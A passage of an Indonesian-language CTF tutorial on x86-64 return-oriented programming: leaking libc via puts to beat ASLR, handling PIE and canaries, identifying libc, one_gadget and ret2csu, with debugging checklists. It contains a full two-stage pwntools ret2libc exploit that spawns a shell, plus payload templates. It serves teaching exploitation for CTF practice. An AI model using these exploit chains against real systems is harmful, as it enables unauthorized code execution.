    # Memanggil system()
    p64(SYSTEM)
)
```

Secara visual:

```text
OFFSET
  │
  ▼
AAAA...
  │
  ▼
RET
  │
  ▼
POP_RDI
  │
  ▼
BINSH
  │
  ▼
SYSTEM
```

---

# ⚙️ Mengapa Ada `RET` Tambahan?

Kadang fungsi libc menggunakan instruksi SSE yang membutuhkan stack alignment tertentu.

Jika alignment salah:

```text
ROP
 │
 ▼
system()
 │
 ▼
libc
 │
 ▼
MOVAPS
 │
 ▼
SIGSEGV
```

Maka kita dapat mencoba:

```text
ret
```

sebelum gadget berikutnya.

Contoh:

```python
# Gadget ret untuk menggeser alignment stack
p64(RET)
```

**Penting:** jangan menganggap `ret` selalu wajib. Alignment bergantung pada state stack saat control flow masuk ke target. Gunakan GDB untuk memverifikasi.

---

# 💻 Step 11 — Kirim Stage 2

```python
# Mengirim payload kedua
p.sendline(chain2)

# Menyerahkan interaksi ke user
p.interactive()
```

---

# 💥 2.4 Full Exploit Script — ret2libc + ASLR Leak

> Script berikut adalah **template CTF**. Sesuaikan prompt parsing, `OFFSET`, binary, libc, dan transport dengan target.

```python
#!/usr/bin/env python3

# Import seluruh fungsi pwntools
from pwn import *

# =========================
# CONFIGURATION
# =========================

# Path binary target
BINARY = "./binary"

# Path libc yang benar untuk target
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"

# Remote target
HOST = "challenge.ctf.com"
PORT = 1337

# Gunakan local process ketika testing
LOCAL = True

# Offset hasil cyclic
OFFSET = 72

# =========================
# SETUP
# =========================

# Load binary ELF
elf = ELF(BINARY, checksec=False)

# Load libc ELF
libc = ELF(LIBC_PATH, checksec=False)

# Set architecture/context dari binary
context.binary = elf

# Menampilkan log level normal
context.log_level = "info"

# =========================
# GADGETS
# =========================

# Membuat ROP object dari binary
rop = ROP(elf)

# Mencari pop rdi ; ret
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]

# Mencari ret sederhana
RET = rop.find_gadget(["ret"])[0]

# Mengambil address main
MAIN = elf.sym["main"]

# Menampilkan informasi penting
log.info(f"POP_RDI = {hex(POP_RDI)}")
log.info(f"RET     = {hex(RET)}")
log.info(f"MAIN    = {hex(MAIN)}")
log.info(f"PUTS@GOT = {hex(elf.got['puts'])}")
log.info(f"PUTS@PLT = {hex(elf.plt['puts'])}")

# =========================
# START TARGET
# =========================

# Menjalankan local atau remote
if LOCAL:
    p = process(elf.path)
else:
    p = remote(HOST, PORT)

# =========================
# STAGE 1 — LEAK
# =========================

# Membuat payload pertama
chain1 = flat(
    # Padding sampai saved RIP
    b"A" * OFFSET,

    # Set RDI = GOT[puts]
    p64(POP_RDI),

    # Argument pertama untuk puts()
    p64(elf.got["puts"]),

    # Memanggil puts melalui PLT
    p64(elf.plt["puts"]),

    # Kembali ke main agar vuln() bisa dipanggil lagi
    p64(MAIN)
)

# Kirim payload pertama
p.sendline(chain1)

# =========================
# PARSE LEAK
# =========================

# Contoh framing sederhana:
# baca satu line dari output target
leaked = p.recvline().strip()

# Log raw bytes untuk debugging
log.info(f"RAW LEAK = {leaked!r}")

# Jika leak hanya memiliki 6 byte,
# tambahkan null byte sampai panjang 8
leaked = leaked.ljust(8, b"\x00")

# Convert little-endian bytes menjadi integer
puts_addr = u64(leaked)

# Tampilkan puts runtime address
log.info(f"puts leak = {hex(puts_addr)}")

# =========================
# LIBC BASE
# =========================

# Menghitung base libc dari runtime puts address
libc_base = puts_addr - libc.sym["puts"]

# Sanity check page alignment
assert libc_base & 0xfff == 0, \
    f"Libc base tidak aligned: {hex(libc_base)}"

# Set base libc dalam pwntools
libc.address = libc_base

# Log hasil
log.info(f"libc base = {hex(libc_base)}")

# =========================
# RESOLVE TARGETS
# =========================

# Mendapatkan runtime address system()
SYSTEM = libc.sym["system"]

# Mencari string /bin/sh di libc
BINSH = next(libc.search(b"/bin/sh\x00"))

# Menampilkan address
log.info(f"SYSTEM = {hex(SYSTEM)}")
log.info(f"BINSH  = {hex(BINSH)}")

# =========================
# STAGE 2 — EXPLOIT
# =========================

# Membuat payload kedua
chain2 = flat(
    # Padding sampai RIP
    b"A" * OFFSET,

    # Gunakan jika alignment memerlukannya
    p64(RET),

    # Set RDI
    p64(POP_RDI),

    # RDI = "/bin/sh"
    p64(BINSH),

    # system("/bin/sh")
    p64(SYSTEM)
)

# Mengirim payload kedua
p.sendline(chain2)

# Masuk interactive shell
p.interactive()
```

---

# 🧪 Contoh Output Full Exploit

Contoh realistis:

```text
[*] './binary'
[*] Arch:       amd64-64-little
[*] NX:         NX enabled
[*] PIE:        No PIE
[*] Canary:     No canary found

[*] POP_RDI = 0x4011ab
[*] RET     = 0x40101a
[*] MAIN    = 0x401176
[*] PUTS@GOT = 0x404018
[*] PUTS@PLT = 0x401030

[+] Starting local process './binary': pid 31782

[*] RAW LEAK = b'\x80\xa9\xe5\xf7\xff\x7f'
[*] puts leak = 0x7ffff7e5a980
[*] libc base = 0x7ffff7dc0000
[*] SYSTEM = 0x7ffff7e4c490
[*] BINSH = 0x7ffff7f95bd8

[*] Switching to interactive mode
$ whoami
ctf
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

---

# 🐛 DEBUG LEAK — KETIKA VALUE SALAH

Ini bagian yang sangat penting.

Misalnya:

```text
[*] puts leak = 0x0
```

atau:

```text
[*] puts leak = 0x6161616161616161
```

atau:

```text
[*] puts leak = 0x0a7ffff7e5a980
```

Jangan langsung mengubah offset secara acak.

Gunakan methodology:

```text
RAW OUTPUT
   │
   ▼
CHECK OFFSET
   │
   ▼
CHECK GADGET
   │
   ▼
CHECK GOT
   │
   ▼
CHECK PLT
   │
   ▼
CHECK PROGRAM FLOW
   │
   ▼
CHECK PARSING
   │
   ▼
CHECK LIBC
```

---

## 🚨 Kasus 1 — Leak `0x0`

Contoh:

```text
[*] puts leak = 0x0
```

Kemungkinan:

```text
GOT address salah
parser salah
chain tidak mencapai puts
puts GOT belum terisi seperti asumsi
program flow salah
```

Debug:

```python
# Tampilkan address GOT
log.info(f"puts@got = {hex(elf.got['puts'])}")

# Tampilkan address PLT
log.info(f"puts@plt = {hex(elf.plt['puts'])}")

# Cetak raw output
log.info(f"raw = {leaked!r}")
```

Di GDB:

```bash
# Menjalankan binary melalui GDB
gdb -q ./binary

# Memeriksa GOT puts
x/gx 0x404018

# Melihat instruksi puts@plt
disassemble puts@plt
```

---

## 🚨 Kasus 2 — Leak `0x616161...`

Contoh:

```text
0x6161616161616161
```

ASCII:

```text
a a a a a a a a
```

Artinya kemungkinan chain tidak tersusun seperti yang kita kira.

Pertanyaan:

```text
Apakah OFFSET benar?
Apakah saved RIP benar-benar dikontrol?
Apakah POP_RDI benar?
Apakah value setelah POP_RDI adalah GOT?
```

---

## 🚨 Kasus 3 — Leak Ada Tetapi Ada `\n`

Contoh:

```text
b'\x80\xa9\xe5\xf7\xff\x7f\n'
```

Jangan langsung:

```python
u64(leaked.ljust(8, b"\x00"))
```

karena:

```text
\n
```

adalah byte:

```text
0x0a
```

dan dapat masuk ke integer.

Gunakan:

```python
# Menghapus whitespace di ujung
leaked = leaked.strip()

# Padding hingga 8 byte
leaked = leaked.ljust(8, b"\x00")

# Parse integer
puts_addr = u64(leaked)
```

Tetapi hati-hati: `.strip()` hanya aman bila newline/whitespace memang framing yang tidak menjadi bagian dari data yang valid.

---

## 🚨 Kasus 4 — Leak Berisi Prompt

Contoh:

```text
b'Welcome!\n\x80\xa9\xe5\xf7\xff\x7f\n'
```

Artinya:

```text
recvline()
```

membaca bagian yang salah.

Perbaiki sinkronisasi:

```python
# Tunggu prompt sebelum mengirim payload
p.recvuntil(b"> ")

# Kirim payload
p.sendline(chain1)

# Ambil line leak
leaked = p.recvline()
```

---

# 🧪 Debug dengan GDB

Gunakan breakpoint:

```gdb
# Masuk ke gdb
gdb -q ./binary

# Break sebelum fungsi vuln selesai
break *vuln+120

# Jalankan program
run

# Lihat register
info registers

# Lihat stack
x/20gx $rsp

# Lihat instruction pointer
x/i $rip

# Lanjutkan eksekusi
continue
```

Cari:

```text
RIP
RSP
RDI
```

Pada stage leak:

```text
RDI harus menunjuk GOT[puts]
```

Misalnya:

```text
RDI = 0x404018
```

Jika:

```text
RDI = 0x4141414141414141
```

berarti chain belum benar.

---

# 🧠 CHECKLIST LEAK DEBUG

```text
[ ] OFFSET benar
[ ] RIP berhasil dikontrol
[ ] POP_RDI benar
[ ] GOT address benar
[ ] PLT address benar
[ ] main address benar
[ ] prompt synchronization benar
[ ] parser menerima data yang benar
[ ] little-endian benar
[ ] padding 8-byte benar
[ ] libc file cocok
[ ] libc base page-aligned
```

---

# 📚 BAGIAN 3 — IDENTIFIKASI LIBC

# 🧠 3.1 Kenapa libc Penting?

Karena:

```text
libc A
   ↓
offset system = X
```

sedangkan:

```text
libc B
   ↓
offset system = Y
```

Jadi:

```text
puts leak benar
+
libc salah
=
system address salah
```

Akibat:

```text
SIGSEGV
```

atau:

```text
exploit gagal
```

---

# 🔎 3.2 Cara Identifikasi Libc

## 🥇 Method 1 — `ldd`

```bash
# Menampilkan shared libraries yang digunakan binary
ldd ./binary
```

Contoh:

```text
linux-vdso.so.1 (0x00007ffc...)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (...)
```

Cari:

```text
libc.so.6
```

---

# 🌐 Method 2 — Identifikasi dari Leak

Dalam CTF kadang kita hanya memiliki:

```text
puts leak
```

Untuk binary remote:

```text
libc lokal ≠ libc remote
```

Kita dapat menggunakan libc fingerprinting/database sesuai challenge.

Contoh konsep:

```text
Known function:
puts

Leaked address:
0x7f...abc

Known lower bytes:
abc
```

Kemudian cocokkan:

```text
candidate libc
   │
   ├── puts offset A
   ├── puts offset B
   └── puts offset C
```

Dengan beberapa symbol leak, confidence meningkat.

---

# 🗃️ Method 3 — libc-database Lokal

```bash
# Clone repository libc-database
git clone https://github.com/niklasb/libc-database.git

# Masuk ke directory
cd libc-database

# Mengambil database libc Ubuntu
./get ubuntu

# Mencari candidate menggunakan function dan address pattern
./find puts 0x...abc
```

Output bergantung pada dataset yang tersedia.

---

# 🐍 Method 4 — LibcSearcher

Contoh konsep:

```python
# Import LibcSearcher
from LibcSearcher import LibcSearcher

# Membuat object berdasarkan symbol yang bocor
obj = LibcSearcher("puts", puts_addr)

# Menghitung libc base
libc_base = puts_addr - obj.dump("puts")

# Menghitung system
system = libc_base + obj.dump("system")

# Menghitung /bin/sh
binsh = libc_base + obj.dump("str_bin_sh")

# Menampilkan address
print(hex(libc_base))
print(hex(system))
print(hex(binsh))
```

> Tools/database dapat memiliki keterbatasan dibandingkan menggunakan libc file yang benar-benar diketahui cocok dengan target. Dalam challenge remote, fingerprinting sebaiknya diverifikasi dengan leak symbol tambahan ketika memungkinkan.

---

# ✅ 3.3 Verify Libc Base

```python
# Pastikan libc base page-aligned
assert libc_base & 0xfff == 0, \
    f"Libc base tidak aligned: {hex(libc_base)}"
```

Contoh:

```text
VALID:
0x7ffff7dc0000

MENCURIGAKAN:
0x7ffff7dc0123
```

---

# 🧪 Verify Lebih Lanjut

Jika sudah memiliki candidate libc:

```python
# Menghitung kembali expected puts address
expected_puts = libc_base + libc.sym["puts"]

# Membandingkan dengan leak
assert expected_puts == puts_addr
```

Ini memberi sanity check yang lebih kuat.

---

# 💥 BAGIAN 4 — SCENARIO ROP CHAIN CTF

# 🎯 4.1 Scenario A — ret2libc + ASLR

Karakteristik:

```text
NX     = ON
PIE    = OFF
ASLR   = ON
Canary = OFF
```

Binary memiliki:

```text
puts@plt
puts@got
pop rdi ; ret
main()
```

Flow:

```text
BOF
 │
 ▼
control RIP
 │
 ▼
pop rdi
 │
 ▼
GOT puts
 │
 ▼
puts@plt
 │
 ▼
leak puts
 │
 ▼
main()
 │
 ▼
vuln()
 │
 ▼
pop rdi
 │
 ▼
/bin/sh
 │
 ▼
system
 │
 ▼
SHELL
```

---

# 🧭 Scenario A — Full Decision

```text
            BOF
             │
             ▼
      Control RIP?
             │
            YES
             │
             ▼
          NX ON?
             │
            YES
             │
             ▼
          win()?
             │
             NO
             │
             ▼
          ASLR ON?
             │
            YES
             │
             ▼
      Ada leak primitive?
             │
            YES
             │
             ▼
       Leak libc address
             │
             ▼
       Calculate libc base
             │
             ▼
         ret2libc
```

---

# 🧩 4.2 Scenario B — PIE + ASLR

Sekarang:

```text
NX     = ON
PIE    = ON
ASLR   = ON
Canary = OFF
```

Masalah:

```text
Binary base juga random.
```

Artinya gadget seperti:

```text
pop rdi
```

juga belum memiliki runtime address yang diketahui.

Contoh:

```text
ELF offset:

pop rdi = 0x11ab
```

Tetapi runtime:

```text
PIE base + 0x11ab
```

Kita perlu:

```text
BINARY LEAK
    │
    ▼
BINARY BASE
    │
    ├── pop rdi runtime
    ├── main runtime
    └── GOT runtime
```

Kemudian:

```text
LIBC LEAK
    │
    ▼
LIBC BASE
```

Maka:

```text
binary leak
     │
     ▼
PIE base
     │
     ▼
binary gadgets
     │
     ▼
libc leak
     │
     ▼
libc base
     │
     ▼
ret2libc
```

### ⚠️ Catatan Penting

Kesalahan umum:

> "Kalau binary PIE, GOT tidak ikut ASLR."

Yang benar:

```text
GOT entry address berada di image binary
```

Jika image PIE dipindahkan:

```text
GOT absolute runtime address
```

juga bergeser bersama binary base.

Yang biasanya tetap:

```text
offset GOT relatif terhadap PIE base
```

Jadi kita perlu mengetahui:

```text
PIE base
```

sebelum menggunakan absolute runtime address pada binary.

---

# 🛡️ 4.3 Scenario C — Canary + NX + ASLR

Sekarang:

```text
NX     = ON
PIE    = ON/OFF
ASLR   = ON
Canary = ON
```

Masalah pertama bahkan sebelum ROP:

```text
overflow
   ↓
canary
   ↓
saved RBP
   ↓
saved RIP
```

Jika canary salah:

```text
stack smashing detected
```

Jadi:

```text
Leak canary
     │
     ▼
Reconstruct stack frame
     │
     ▼
Preserve canary
     │
     ▼
Control RIP
     │
     ▼
ROP
```

Konsep ini menjadi materi lanjutan karena sering memerlukan:

```text
format string
partial leak
stack leak
thread-local storage analysis
```

Lanjutkan studi ke workflow vulnerability/leak yang relevan sebelum mencoba menggabungkannya dengan ROP.

---

# 🚀 BAGIAN 5 — ONE_GADGET

# 🧠 5.1 Apa Itu `one_gadget`?

`one_gadget` mencari lokasi tertentu di libc yang dalam kondisi tertentu dapat menghasilkan shell secara langsung.

Secara konsep:

```text
ret
 │
 ▼
ONE_GADGET
 │
 ▼
/bin/sh
```

Dibanding:

```text
pop rdi
   │
   ▼
/bin/sh
   │
   ▼
system
```

one_gadget terlihat lebih pendek.

Tetapi:

```text
ONE_GADGET
    │
    ▼
HAS CONSTRAINTS
```

---

# 📦 5.2 Install

```bash
# Menginstall tool one_gadget melalui RubyGems
gem install one_gadget
```

---

## 🔎 Cari one_gadget

```bash
# Mencari candidate one_gadget pada libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

Contoh output realistis:

```text
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL
  r12 == NULL
```

> Offset dan constraint dapat berbeda antar versi libc.

> ⚠️ **PERINGATAN IMPORATNT:** Offset `0x4f2a5` di atas adalah **CONTOH** untuk satu versi libc tertentu. Offset ini BERBEDA di setiap versi libc! Selalu jalankan `one_gadget /path/to/target/libc.so.6` dengan libc binary TARGET, jangan langsung menyalin offset angka dari contoh ini ke binary lain.

---

## 🎚️ Level

```bash
# Menampilkan gadget dengan tingkat pencarian tertentu
one_gadget /lib/x86_64-linux-gnu/libc.so.6 --level 1
```

Jangan copy angka offset secara buta.

Gunakan output dari libc yang tepat.

---

# 🧠 5.3 Cara Menggunakan

Setelah:

```text
libc_base diketahui
```

dan one_gadget:

```text
0x4f2a5
```

maka:

```python
# Offset one_gadget dari libc
ONE_GADGET_OFFSET = 0x4f2a5

# Menghitung runtime address
ONE_GADGET = libc_base + ONE_GADGET_OFFSET

# Payload sederhana
chain2 = flat(
    # Offset buffer
    b"A" * OFFSET,

    # Lompat ke one_gadget
    p64(ONE_GADGET)
)
```

---

# ⚠️ 5.4 Kapan One_Gadget Gagal?

Misalnya output:

```text
constraints:
  rcx == NULL
```

Tetapi saat runtime:

```text
RCX = 0x7ffff7...
```

maka:

```text
constraint FAIL
```

Exploit gagal.

---

# 🔍 Debug Constraint

Di GDB:

```gdb
# Menampilkan register
info registers

# Memeriksa RCX
p/x $rcx

# Memeriksa stack
x/20gx $rsp
```

Bandingkan:

```text
required:
rcx == NULL
```

dengan:

```text
actual:
rcx = 0x7ffff7...
```

---

# 🧠 Fallback Strategy

Jangan memaksa one_gadget.

Gunakan:

```text
one_gadget
   │
   ├── constraint OK → gunakan
   │
   └── constraint FAIL
            │
            ▼
         ret2libc
            │
            ▼
      pop rdi ; ret
            │
            ▼
         /bin/sh
            │
            ▼
          system
```

Ret2libc lebih panjang, tetapi sering lebih mudah dikontrol.

---

# 🧬 BAGIAN 6 — ret2csu

# 🔎 6.0 Cara Identifikasi `ret2csu` di Binary Nyata

Sebelum mencoba menyusun ret2csu payload, langkah awal adalah memverifikasi keberadaan dan lokasi gadget di binary target:

```bash
# === CARA IDENTIFIKASI ret2csu DI BINARY NYATA ===

# Step 1: Cek apakah binary mempunyai __libc_csu_init
nm ./binary | grep "__libc_csu_init"
# atau
readelf -Ws ./binary | grep "csu"

# Step 2: Disassemble fungsi untuk melihat struktur gadget
objdump -d ./binary | grep -A40 "__libc_csu_init"

# Step 3: Cari dua gadget penting menggunakan ROPgadget
# Gadget 1 (pop many registers: rbx, rbp, r12, r13, r14, r15):
ROPgadget --binary ./binary | grep "pop rbx"

# Gadget 2 (move + call):
ROPgadget --binary ./binary | grep "call qword"
# atau
ROPgadget --binary ./binary | grep "mov rdx"

# Step 4: Verifikasi manual di GDB
# gdb ./binary
# pwndbg> b *__libc_csu_init
# pwndbg> run
# pwndbg> disassemble
```

> ⚠️ **PENTING:** Binary yang dikompilasi dengan GCC versi baru (e.g. GCC 11+) dan modern linker/glibc mungkin tidak lagi meng-include `__libc_csu_init` karena telah dipindahkan ke fungsi inisialisasi internal libc. Selalu periksa dengan `readelf` / `nm` sebelum mengasumsikan ret2csu dapat digunakan!

---

# 🧠 6.1 Kapan ret2csu Dibutuhkan?

Masalah:

```text
Tidak ada pop rdi ; ret
```

Tetapi binary memiliki:

```text
__libc_csu_init
```

Pada banyak binary x86-64 klasik, terdapat gadget yang dapat membantu mengontrol beberapa register sekaligus.

Konsepnya:

```text
NO pop rdi
     │
     ▼
__libc_csu_init
     │
     ▼
CSU gadgets
     │
     ▼
CONTROL REGISTERS
```

---

# 🔧 6.2 Konsep ret2csu

Biasanya terdapat dua gadget penting.

### Gadget pertama

Kurang lebih berbentuk:

```asm
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret
```

Digunakan untuk memasukkan nilai.

---

### Gadget kedua

Kurang lebih memiliki pola:

```asm
mov rdx, r14
mov rsi, r13
mov edi, r12d
call qword ptr [r15 + rbx*8]
...
ret
```

Exact instructions dapat berbeda bergantung compiler/toolchain/binary.

---

# 🔄 Diagram ret2csu

```text
            STACK
              │
              ▼
     ┌───────────────────┐
     │ CSU GADGET 1      │
     └─────────┬─────────┘
               │
               ▼
        RBX / RBP / R12
        R13 / R14 / R15
               │
               ▼
     ┌───────────────────┐
     │ CSU GADGET 2      │
     └─────────┬─────────┘
               │
               ├── RDX ← R14
               ├── RSI ← R13
               ├── EDI ← R12D
               └── CALL [R15 + RBX*8]
                        │
                        ▼
                     TARGET
```

---

# 🧱 6.3 Template ret2csu

```python
# Gadget pertama untuk mengisi register CSU
CSU_GADGET1 = 0x40129a

# Gadget kedua untuk melakukan register setup + indirect call
CSU_GADGET2 = 0x401280

# Target pointer yang akan digunakan oleh indirect call
TARGET_PTR = 0x404018

# Chain contoh ret2csu
payload = flat(
    # Padding
    b"A" * OFFSET,

    # CSU gadget 1
    p64(CSU_GADGET1),

    # RBX
    p64(0),

    # RBP
    p64(1),

    # R12
    p64(0),

    # R13 -> RSI
    p64(ARG2),

    # R14 -> RDX
    p64(ARG3),

    # R15 -> pointer target call
    p64(TARGET_PTR),

    # Return into CSU gadget 2
    p64(CSU_GADGET2),

    # Tambahkan stack values sesuai epilogue gadget
    p64(0) * 7
)
```

> Angka address dan jumlah nilai stack **harus disesuaikan dengan gadget yang benar-benar ditemukan pada binary**. Jangan copy template ini tanpa menyesuaikan disassembly.

---

# 🔎 Mencari CSU Gadget

Gunakan:

```bash
# Mencari referensi instruksi libc_csu_init atau gadget terkait
objdump -d ./binary | grep -A40 "__libc_csu_init"
```

atau:

```bash
# Menampilkan seluruh gadget yang tersedia
ROPgadget --binary ./binary
```

Binary modern dapat memiliki layout/toolchain yang berbeda, sehingga jangan menganggap fungsi bernama `__libc_csu_init` pasti ada atau memiliki gadget klasik yang sama.

---

# 🧠 COMMON ERRORS & TROUBLESHOOTING

# 🚨 BAGIAN 7 — Common Errors

|Error|Penyebab|Solusi|
|---|---|---|
|Leak `0x0`|Chain/parser/GOT salah|Debug `RDI`, GOT, PLT, raw output|
|Leak random|Parser salah|Tampilkan `repr(leaked)`|
|Libc base tidak aligned|Leak atau libc salah|Pastikan `base & 0xfff == 0`|
|`system()` crash setelah leak|Libc salah atau alignment|Verify libc + gadget + stack alignment|
|`No gadget found` untuk `pop rdi`|Gadget memang tidak ada|Cari alternatif / ret2csu|
|one_gadget gagal|Constraint tidak terpenuhi|Debug register/stack atau gunakan ret2libc|
|`recvuntil()` timeout|Delimiter salah|Lihat raw output dan prompt|
|Local works, remote fails|Libc/protocol berbeda|Identifikasi remote libc dan timing|
|LibcSearcher tidak menemukan match|Leak terlalu sedikit|Leak symbol tambahan|
|Wrong libc version|Local libc berbeda|Cari libc exact/compatible|
|GOT vs PLT tertukar|Salah konsep|GOT = runtime pointer, PLT = call stub|
|PIE aktif|Address binary berubah|Leak binary base terlebih dahulu|
|Canary detected|Canary menghalangi RIP control|Canary leak/bypass dulu|
|ret2csu tidak ditemukan|Layout binary berbeda|Cari gadget alternatif/disassembly|
|Alignment crash|`rsp` alignment salah|Test tambahan `ret` dan debug `$rsp`|
|Double-free/corruption|Gadget/stack chain salah|Periksa stack layout dan pointer|
|Shell tidak muncul|`system` atau `/bin/sh` salah|Verify runtime addresses|
|`u64()` error|Bytes kurang dari expected|Gunakan `ljust(8, b"\x00")` sesuai konteks|
|Leak mengandung prompt|Synchronization salah|`recvuntil(prompt)` sebelum parse|
|`SIGSEGV` di `ret`|Stack address salah|Lihat `$rsp`, chain order, OFFSET|
|`SIGILL`|Lompat ke data/invalid instruction|Verify gadget address|
|`SIGABRT`|Canary/abort|Periksa canary atau invalid program state|
|Gadget address berubah|PIE/ASLR|Hitung runtime base|
|`system()` benar tetapi shell tidak muncul|Argument salah|Verify `RDI = BINSH`|
|Leak hanya 1–2 byte|Output terminator|Gunakan primitive leak lain atau multiple leaks|

---

# 🔍 ERROR 1 — Leak `0x0`

Debug:

```python
# Tampilkan address GOT
log.info(f"GOT = {hex(elf.got['puts'])}")

# Tampilkan raw bytes
log.info(f"RAW = {leaked!r}")

# Tampilkan hasil integer
log.info(f"LEAK = {hex(puts_addr)}")
```

Lalu GDB:

```gdb
# Periksa isi GOT
x/gx 0x404018

# Periksa RDI ketika menuju puts
info registers rdi

# Periksa RIP
info registers rip
```

Expected:

```text
RDI = GOT[puts]
```

---

# 🔍 ERROR 2 — `recvuntil()` Timeout

Misalnya:

```python
# Menunggu delimiter yang ternyata tidak pernah dikirim
p.recvuntil(b"Input:")
```

Program dapat macet karena target sebenarnya mencetak:

```text
Name:
```

Cari framing yang benar:

```python
# Menunggu delimiter prompt yang benar
p.recvuntil(b"Name:")
```

---

# 🔍 ERROR 3 — Local Works, Remote Fails

Ini sangat umum.

```text
LOCAL
libc A

REMOTE
libc B
```

Maka:

```text
puts offset local ≠ puts offset remote
```

Bahkan jika binary sama.

Gunakan:

```text
remote leak
     ↓
identify libc
     ↓
calculate remote base
     ↓
calculate system
```

---

# 🔍 ERROR 4 — Wrong Libc

Jika:

```python
SYSTEM = libc.sym["system"]
```

menghasilkan address yang masuk akal tetapi exploit tetap crash:

```text
libc mismatch
```

Verifikasi:

```text
puts offset
system offset
/bin/sh offset
```

terhadap libc target.

---

# 🔍 ERROR 5 — `system()` Crash

Kemungkinan:

```text
wrong libc
wrong BINSH
wrong SYSTEM
wrong RSP alignment
wrong POP_RDI
```

Debug:

```gdb
# Periksa register saat masuk system
info registers

# Periksa RDI
p/x $rdi

# Periksa stack
x/10gx $rsp
```

Expected:

```text
RDI = address "/bin/sh"
```

---

# 🔍 ERROR 6 — Alignment

Jika:

```text
leak berhasil
system address benar
BINSH benar
```

tetapi:

```text
SIGSEGV di internal libc
```

cek:

```gdb
# Menampilkan nilai stack pointer
p/x $rsp
```

Perhatikan alignment:

```text
$rsp % 16
```

Coba chain:

```text
RET
POP_RDI
BINSH
SYSTEM
```

dibanding:

```text
POP_RDI
BINSH
SYSTEM
```

Jangan menambahkan `ret` secara otomatis tanpa memahami posisi stack.

---

# 🔍 ERROR 7 — `u64()` Gagal

Contoh:

```text
ValueError
```

Karena:

```python
# Leak hanya memiliki 5 byte
u64(b"\x80\xa9\xe5\xf7\xff")
```

Gunakan padding:

```python
# Tambahkan null byte sampai 8 byte
value = leak.ljust(8, b"\x00")

# Convert menjadi integer
addr = u64(value)
```

---

# 🔍 ERROR 8 — `u64()` Menghasilkan Address Aneh

Misalnya:

```text
0x0a7ffff7e5a980
```

Kemungkinan:

```text
newline masuk sebagai byte address
```

Debug:

```python
# Tampilkan bytes mentah
print(repr(leak))
```

---

# 🧠 7.1 Debugging Checklist Lengkap

```text
[ ] checksec
[ ] OFFSET
[ ] RIP control
[ ] POP_RDI
[ ] GOT
[ ] PLT
[ ] MAIN
[ ] raw leak
[ ] parser
[ ] little endian
[ ] 8-byte padding
[ ] libc version
[ ] libc base alignment
[ ] SYSTEM
[ ] BINSH
[ ] RSP alignment
[ ] remote protocol
```

---

# 🌳 BAGIAN 8 — DECISION TREE ROP

```text
                    ┌───────────────────┐
                    │     BOF FOUND     │
                    └─────────┬─────────┘
                              │
                              ▼
                    ┌───────────────────┐
                    │ Control RIP/EIP?  │
                    └─────────┬─────────┘
                              │
                             YES
                              │
                              ▼
                    ┌───────────────────┐
                    │      NX ON?       │
                    └─────────┬─────────┘
                              │
                             YES
                              │
                              ▼
                    ┌───────────────────┐
                    │    Ada win()?     │
                    └─────────┬─────────┘
                              │
                             NO
                              │
                              ▼
                    ┌───────────────────┐
                    │     ASLR ON?      │
                    └─────────┬─────────┘
                       ┌──────┴──────┐
                      NO             YES
                       │               │
                       ▼               ▼
               ┌─────────────┐   ┌──────────────┐
               │ Direct      │   │ BUTUH LEAK   │
               │ ret2libc    │   └──────┬───────┘
               └─────────────┘          │
                                        ▼
                              ┌────────────────────┐
                              │ PIE ON atau OFF?   │
                              └─────────┬──────────┘
                                   ┌────┴────┐
                                  OFF       ON
                                   │         │
                                   ▼         ▼
                          ┌────────────┐  ┌─────────────┐
                          │ libc leak  │  │ binary leak │
                          │ langsung   │  │ terlebih    │
                          └─────┬──────┘  │ dahulu     │
                                │         └──────┬──────┘
                                │                │
                                │                ▼
                                │          ┌─────────────┐
                                │          │ PIE base    │
                                │          └──────┬──────┘
                                │                 │
                                └────────┬────────┘
                                         ▼
                              ┌────────────────────┐
                              │ ADA puts/printf?   │
                              └─────────┬──────────┘
                                  ┌─────┴─────┐
                                 YES         NO
                                  │           │
                                  ▼           ▼
                         ┌──────────────┐  ┌──────────────┐
                         │ LEAK via     │  │ Format       │
                         │ puts(GOT)    │  │ String?      │
                         └──────┬───────┘  └──────┬───────┘
                                │                 │
                                │                 ▼
                                │          [Workflow Lain]
                                │
                                ▼
                     ┌─────────────────────┐
                     │ HITUNG LIBC BASE    │
                     └──────────┬──────────┘
                                │
                                ▼
                    ┌────────────────────────┐
                    │ Coba one_gadget dulu?  │
                    └───────────┬────────────┘
                            ┌────┴────┐
                           WORKS     FAIL
                              │        │
                              ▼        ▼
                           [SHELL] ┌─────────────────┐
                                   │ ret2libc biasa  │
                                   │                 │
                                   │ pop rdi         │
                                   │       ↓         │
                                   │ /bin/sh         │
                                   │       ↓         │
                                   │ system()        │
                                   └────────┬────────┘
                                            │
                                            ▼
                                         [SHELL]
```

---

# ⚡ BAGIAN 9 — QUICK REFERENCE CHEATSHEET

# 🔎 9.1 ROP One-Liners

```bash
# Menampilkan semua gadget
ROPgadget --binary ./binary

# Mencari pop rdi
ROPgadget --binary ./binary | grep "pop rdi"

# Mencari pop rsi
ROPgadget --binary ./binary | grep "pop rsi"

# Mencari pop rdx
ROPgadget --binary ./binary | grep "pop rdx"

# Mencari pop rax
ROPgadget --binary ./binary | grep "pop rax"

# Mencari ret
ROPgadget --binary ./binary | grep ": ret$"

# Mencari one_gadget
one_gadget ./libc.so.6

# Melihat libc dependency
ldd ./binary | grep libc

# Menampilkan symbol puts
readelf -Ws ./binary | grep puts

# Menampilkan referensi PLT/GOT
objdump -d ./binary | grep puts
```

---

# 🐍 9.2 Pwntools ROP Template

```python
#!/usr/bin/env python3

# Import pwntools
from pwn import *

# =========================
# CONFIG
# =========================

# Target binary
BINARY = "./binary"

# Libc file
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"

# Remote target
HOST = "challenge.ctf.com"
PORT = 1337

# Local testing mode
LOCAL = True

# Buffer overflow offset
OFFSET = 72

# =========================
# LOAD ELF
# =========================

# Load binary
elf = ELF(BINARY, checksec=False)

# Load libc
libc = ELF(LIBC_PATH, checksec=False)

# Configure architecture
context.binary = elf

# Configure logs
context.log_level = "info"

# =========================
# ROP GADGETS
# =========================

